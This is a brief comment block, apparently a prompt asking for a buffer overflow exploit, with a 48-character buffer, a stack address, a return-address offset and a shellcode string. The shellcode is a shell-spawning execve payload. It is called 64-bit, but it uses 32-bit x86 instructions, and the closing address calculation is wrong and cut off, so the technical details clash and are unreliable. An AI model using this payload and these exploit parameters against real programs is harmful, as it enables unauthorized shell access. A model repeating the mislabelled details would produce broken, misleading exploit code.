# Write a buffer overflow exploit that runs 64 bit shellcode with a buffer size of 48
# characters.
#
# The shellcode is:
#
# "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
#
# The address of the buffer is:0xbffff6e8
#
# The offset to the return address is: 40
#
# The address of the return address is: 0xbffff6e8 + 40 + 8 = 0xbffff
